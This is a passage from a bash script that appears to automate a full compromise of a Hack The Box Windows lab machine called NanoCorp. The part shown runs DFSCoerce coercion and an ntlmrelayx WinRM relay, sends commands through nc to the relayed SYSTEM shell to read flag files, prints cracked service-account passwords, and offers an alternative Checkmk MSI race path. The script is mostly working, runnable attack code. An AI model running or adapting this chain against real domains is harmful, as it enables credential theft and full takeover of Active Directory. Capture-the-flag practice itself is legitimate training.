        "$ntlmrelayx_bin" -i -smb2support -t "$relay_target" > "$relay_log" 2>&1 &
        relay_pid=$!
        info "ntlmrelayx PID: $relay_pid"

        ready=0
        for ((i=0; i<30; i++)); do
            if grep -qi "Protocol Client WINRMS loaded" "$relay_log"; then
                ready=1
                break
            fi
            sleep 1
        done
        if (( ready != 1 )); then
            warn "WINRMS client did not initialize for $relay_target"
            kill "$relay_pid" 2>/dev/null || true
            continue
        fi
        ok "ntlmrelayx ready for $relay_target"

        for listener in "${listeners[@]}"; do
            info "Coercion listener: $listener"
            for ((i=1; i<=3; i++)); do
                info "DFSCoerce attempt $i/3"
                python3 "$dfscoerce_py" \
                    -u "$WEBSVC_USER" \
                    -p "$WEBSVC_PASS" \
                    -d "$DOMAIN" \
                    "$listener" "$TARGET_IP" >> "$coercer_log" 2>&1 || true
                sleep 6

                relay_port=$(grep -oP '127\.0\.0\.1:\K[0-9]+' "$relay_log" | tail -1 || true)
                if [[ -n "$relay_port" ]]; then
                    ok "Relayed WinRM shell opened on 127.0.0.1:$relay_port"
                    break 3
                fi
            done
        done

        kill "$relay_pid" 2>/dev/null || true
        [[ -n "$relay_port" ]] && break
    done

    if [[ -z "$relay_port" ]]; then
        warn "No interactive relay port detected. Check logs:"
        warn "  $relay_log"
        warn "  $coercer_log"
        return 1
    fi

    # ── Step 4: Non-interactive command extraction via relayed shell ─────────
    step "Step B-4: Pulling flags from relayed SYSTEM shell..."

    relay_exec() {
        local c="$1"
        printf "%s\r\n" "$c" | timeout 12 nc 127.0.0.1 "$relay_port" 2>/dev/null || true
    }

    out=$(relay_exec "whoami")
    info "Relay whoami: $(echo "$out" | tr -d '\r' | grep -iE 'authority|\\\\' | head -1 | xargs || echo unknown)"

    if ! read_flag_from_file "$LOOT_DIR/user.txt" >/dev/null 2>&1; then
        for cmd in \
            'type C:\Users\monitoring_svc\Desktop\user.txt' \
            'powershell -NoP -NonI -Command "Get-ChildItem C:\Users -Filter user.txt -Recurse -ErrorAction SilentlyContinue | ForEach-Object {Get-Content $_.FullName}"'
        do
            out=$(relay_exec "$cmd")
            echo "$out" >> "$LOG_DIR/relay_userflag.log"
            user_flag=$(echo "$out" | extract_flag_token || true)
            [[ -n "$user_flag" ]] && break
        done
        [[ -n "$user_flag" ]] && save_flag_file "user" "$user_flag" || true
    fi

    for cmd in \
        'type C:\Users\Administrator\Desktop\root.txt' \
        'powershell -NoP -NonI -Command "Get-Content C:\Users\Administrator\Desktop\root.txt"'
    do
        out=$(relay_exec "$cmd")
        echo "$out" >> "$LOG_DIR/relay_rootflag.log"
        root_flag=$(echo "$out" | extract_flag_token || true)
        [[ -n "$root_flag" ]] && break
    done

    kill "$relay_pid" 2>/dev/null || true

    if [[ -n "$root_flag" ]]; then
        save_flag_file "root" "$root_flag" || true
        pwned "NanoCorp"
    else
        warn "Root flag not captured automatically. Check:"
        warn "  $LOG_DIR/relay_rootflag.log"
        warn "  $relay_log"
    fi
}

# ─── PHASE 9: FINAL SUMMARY ───────────────────────────────────────────────────
phase9_summary() {
    banner "PHASE 9 Loot Summary"

    echo -e "\n${BOLD}${GREEN}╔══════════════════════════════════════════════════════════════╗${RESET}"
    echo -e "${BOLD}${GREEN}║              NANOCORP PWNED 💀                             ║${RESET}"
    echo -e "${BOLD}${GREEN}╚══════════════════════════════════════════════════════════════╝${RESET}"
    echo

    echo -e "${BOLD}${CYAN}[ CREDENTIALS ]${RESET}"
    echo -e "  web_svc        : ${YELLOW}dksehdgh712!@#${RESET}"
    echo -e "  monitoring_svc : ${YELLOW}P@ssw0rd444!${RESET}"
    echo -e "  Administrator  : via RunasCs/NTLM relay"
    echo

    echo -e "${BOLD}${CYAN}[ FLAGS ]${RESET}"
    local shown_user shown_root
    shown_user="$(read_flag_from_file "$LOOT_DIR/user.txt" || true)"
    shown_root="$(read_flag_from_file "$LOOT_DIR/root.txt" || true)"

    if [[ -n "$shown_user" ]]; then
        echo -e "  USER FLAG  : ${YELLOW}${shown_user}${RESET}"
    else
        echo -e "  USER FLAG  : ${RED}Not captured (check $LOOT_DIR/user.txt)${RESET}"
    fi

    if [[ -n "$shown_root" ]]; then
        echo -e "  ROOT FLAG  : ${YELLOW}${shown_root}${RESET}"
    else
        echo -e "  ROOT FLAG  : ${RED}Not captured (check $LOOT_DIR/root.txt)${RESET}"
    fi

    echo
    echo -e "${BOLD}${CYAN}[ LOOT DIRECTORY ]${RESET}"
    ls -la "$LOOT_DIR/" 2>/dev/null | tail -20

    echo
    echo -e "${BOLD}${CYAN}[ ATTACK CHAIN ]${RESET}"
    cat <<CHAIN
  hire.nanocorp.htb ZIP upload (CVE-2025-24071 .library-ms)
      ↓
  Responder captures web_svc NTLMv2
      ↓
  hashcat → dksehdgh712!@#
      ↓
  bloodyAD: web_svc → IT_SUPPORT → ForceChangePassword monitoring_svc
      ↓
  monitoring_svc : P@ssw0rd444! → netexec/wmiexec (non-interactive) → USER FLAG
      ↓
  Path B (default): DFSCoerce → ntlmrelayx → WinRM relay → SYSTEM → ROOT FLAG
  Path A (optional/manual): RunasCs + Checkmk MSI race → Administrator → ROOT FLAG

CHAIN

    echo -e "${BOLD}${MAGENTA}MITRE ATT&CK Coverage:${RESET}"
    echo "  T1171    LLMNR/NBT-NS Poisoning (Responder)"
    echo "  T1212    CVE-2025-24071 Exploitation"
    echo "  T1110.002 Password Cracking (hashcat)"
    echo "  T1069    Group Discovery (BloodHound)"
    echo "  T1484.001 Group Policy / AD ACL Abuse (bloodyAD)"
    echo "  T1021.006 WinRM Remote Services"
    echo "  T1557.001 NTLM Relay (DFSCoerce + ntlmrelayx)"
    echo "  T1546.015 COM Object Hijacking / MSI Race"

    echo
    ok "All done. Loot saved to: $LOOT_DIR"
}

# ─── ROOT PATH SELECTOR ───────────────────────────────────────────────────────
choose_root_path() {
    local choice="${ROOT_PATH}"

    if (( AUTO_YES == 0 )); then
        banner "ROOT PATH SELECTION"
        echo -e "${BOLD}Choose your root escalation path:${RESET}"
        echo -e "  ${CYAN}[A]${RESET} Checkmk MSI Race Condition via RunasCs (interactive)"
        echo -e "  ${CYAN}[B]${RESET} NTLM Coercion → DFSCoerce → ntlmrelayx → WinRM Relay (auto)"
        echo -e "  ${CYAN}[S]${RESET} Skip root (just get user flag)"
        echo
        echo -n "Choice [A/B/S]: "
        read -r choice
        choice="${choice^^}"
    else
        info "Auto mode: selecting root path '${choice}'"
    fi

    case "${choice^^}" in
        A) phase8a_root_checkmk_auto || phase8a_root_checkmk ;;
        B)
            if ! phase8b_root_relay; then
                warn "Path B failed. Falling back to automated Path A..."
                phase8a_root_checkmk_auto || warn "Path A auto fallback also failed"
            fi
            ;;
        S) warn "Skipping root you can run phase8a or phase8b manually later" ;;
        *) warn "Invalid choice defaulting to Path B"
           if ! phase8b_root_relay; then
               warn "Path B failed. Falling back to automated Path A..."
               phase8a_root_checkmk_auto || warn "Path A auto fallback also failed"
           fi
           ;;
    esac
}

# ─── MAIN ─────────────────────────────────────────────────────────────────────
main() {
    parse_args "$@"
    if [[ -n "${TERM:-}" ]]; then
        clear || true
    fi
    echo -e "${BOLD}${RED}"
    cat <<'LOGO'
  ███╗   ██╗ █████╗ ███╗   ██╗ ██████╗  ██████╗ ██████╗ ██████╗ ██████╗
  ████╗  ██║██╔══██╗████╗  ██║██╔═══██╗██╔════╝██╔═══██╗██╔══██╗██╔══██╗
  ██╔██╗ ██║███████║██╔██╗ ██║██║   ██║██║     ██║   ██║██████╔╝██████╔╝
  ██║╚██╗██║██╔══██║██║╚██╗██║██║   ██║██║     ██║   ██║██╔══██╗██╔═══╝
  ██║ ╚████║██║  ██║██║ ╚████║╚██████╔╝╚██████╗╚██████╔╝██║  ██║██║
  ╚═╝  ╚═══╝╚═╝  ╚═╝╚═╝  ╚═══╝ ╚═════╝  ╚═════╝ ╚═════╝ ╚═╝  ╚═╝╚═╝
                                         HTB Auto-Pwn | Hard | Windows
LOGO
    echo -e "${RESET}"

    echo -e "  ${BOLD}${CYAN}Target:${RESET}  ${TARGET_IP:-<not set>}"
    echo -e "  ${BOLD}${CYAN}Domain:${RESET}  nanocorp.htb | dc01.nanocorp.htb"
    echo -e "  ${BOLD}${CYAN}Ports:${RESET}   80, 88, 445, 5986 (WinRM-SSL), 6556 (Checkmk)"
    echo -e "  ${BOLD}${CYAN}Author:${RESET}  Shadow Junior 😈"
    echo -e "  ${BOLD}${CYAN}Mode:${RESET}    RootPath=${ROOT_PATH} | ResumeFrom=${RESUME_FROM} | Recon=$([[ $WITH_RECON -eq 1 ]] && echo ON || echo OFF)"
    echo

    check_arg
    require_root
    setup_dirs
    seed_state_from_legacy

    # Detect attacker IP early
    LHOST=$(get_tun0_ip)
    info "Attacker LHOST: $LHOST"
    info "Working dir:    $WORK_DIR"
    echo

    local start_time
    start_time=$(date +%s)

    run_phase 0 phase0_prereqs
    run_phase 1 phase1_target_prep
    run_phase 2 phase2_timesync
    run_phase 3 phase3_cve_exploit
    run_phase 4 phase4_crack
    run_phase 5 phase5_ad_enum
    run_phase 6 phase6_privesc
    run_phase 7 phase7_user_flag
    run_phase 8 choose_root_path
    run_phase 9 phase9_summary

    local end_time
    end_time=$(date +%s)
    local elapsed=$(( end_time - start_time ))
    local mins=$(( elapsed / 60 ))
    local secs=$(( elapsed % 60 ))

    echo -e "\n${BOLD}${GREEN}Total time: ${mins}m ${secs}s${RESET}"
    echo -e "${BOLD}${RED}💀 Shadow Junior was here 💀${RESET}\n"
}

# ─── ENTRYPOINT ───────────────────────────────────────────────────────────────
main "$@"
